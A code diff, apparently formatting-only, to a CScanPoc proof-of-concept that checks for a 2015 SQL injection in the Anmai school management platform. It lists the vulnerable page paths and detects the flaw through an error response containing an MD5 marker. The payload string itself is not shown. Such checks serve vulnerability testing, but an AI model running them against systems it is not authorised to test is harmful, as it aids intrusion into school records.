@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Anmai_0002' # 平台漏洞编号，留空
+    vuln_id = 'Anmai_0002'  # 平台漏洞编号，留空
     name = '安脉学校综合管理平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-14'  # 漏洞公布时间
     desc = '''
         安脉学校综合管理平台页面参数过滤不完整，导致SQL注入漏洞：
@@ -35,6 +36,7 @@ class Vuln(ABVuln):
     product = '安脉学校综合管理平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '7cf18915-8594-48df-8248-b1dbb1994c70'
     author = '47bwy'  # POC编写者
@@ -47,7 +49,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             # _Refer_  = http://www.wooyun.org/bugs/wooyun-2010-0107248
             urls = [
                 "/Asset/House/HouseInfo_View.aspx?HouseID=1",
@@ -72,7 +74,7 @@ class Poc(ABPoc):
             for url in urls:
                 verify_url = self.target + url + data
                 r = requests.get(verify_url)
-                
+
                 if r.status_code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in r.content:
                     #security_hole(arg + url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -83,6 +85,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
